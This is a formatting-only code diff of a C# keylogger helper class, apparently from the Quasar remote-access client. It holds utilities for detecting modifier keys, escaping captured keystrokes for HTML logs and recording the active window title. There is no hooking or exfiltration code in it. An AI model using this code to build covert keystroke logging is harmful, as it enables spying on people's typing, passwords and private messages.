@@ -1,13 +1,10 @@
 ﻿using System.Collections.Generic;
 using System.Windows.Forms;
 
-namespace Quasar.Client.Helper
-{
-    public static class KeyloggerHelper
-    {
+namespace Quasar.Client.Helper {
+    public static class KeyloggerHelper {
         #region "Extension Methods"
-        public static bool IsModifierKeysSet(this List<Keys> pressedKeys)
-        {
+        public static bool IsModifierKeysSet(this List<Keys> pressedKeys) {
             return pressedKeys != null &&
                 (pressedKeys.Contains(Keys.LControlKey)
                 || pressedKeys.Contains(Keys.RControlKey)
@@ -19,8 +16,7 @@ namespace Quasar.Client.Helper
                 || pressedKeys.Contains(Keys.Alt));
         }
 
-        public static bool IsModifierKey(this Keys key)
-        {
+        public static bool IsModifierKey(this Keys key) {
             return (key == Keys.LControlKey
                 || key == Keys.RControlKey
                 || key == Keys.LMenu
@@ -31,13 +27,11 @@ namespace Quasar.Client.Helper
                 || key == Keys.Alt);
         }
 
-        public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c)
-        {
+        public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c) {
             return pressedKeys.Contains((Keys)char.ToUpper(c));
         }
 
-        public static bool IsExcludedKey(this Keys k)
-        {
+        public static bool IsExcludedKey(this Keys k) {
             // The keys below are excluded. If it is one of the keys below,
             // the KeyPress event will handle these characters. If the keys
             // are not any of those specified below, we can continue.
@@ -51,17 +45,14 @@ namespace Quasar.Client.Helper
         }
         #endregion
 
-        public static bool DetectKeyHolding(List<char> list, char search)
-        {
+        public static bool DetectKeyHolding(List<char> list, char search) {
             return list.FindAll(s => s.Equals(search)).Count > 1;
         }
 
-        public static string Filter(char key)
-        {
+        public static string Filter(char key) {
             if ((int)key < 32) return string.Empty;
 
-            switch (key)
-            {
+            switch (key) {
                 case '<':
                     return "&lt;";
                 case '>':
@@ -80,13 +71,11 @@ namespace Quasar.Client.Helper
             return key.ToString();
         }
 
-        public static string Filter(string input)
-        {
+        public static string Filter(string input) {
             return input.Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;").Replace("'", "&apos;");
         }
 
-        public static string GetDisplayName(Keys key, bool altGr = false)
-        {
+        public static string GetDisplayName(Keys key, bool altGr = false) {
             string name = key.ToString();
             if (name.Contains("ControlKey"))
                 return "Control";
@@ -99,8 +88,7 @@ namespace Quasar.Client.Helper
             return name;
         }
 
-        public static string GetActiveWindowTitle()
-        {
+        public static string GetActiveWindowTitle() {
             string title = NativeMethodsHelper.GetForegroundWindowTitle();
 
             return (!string.IsNullOrEmpty(title)) ? title : null;
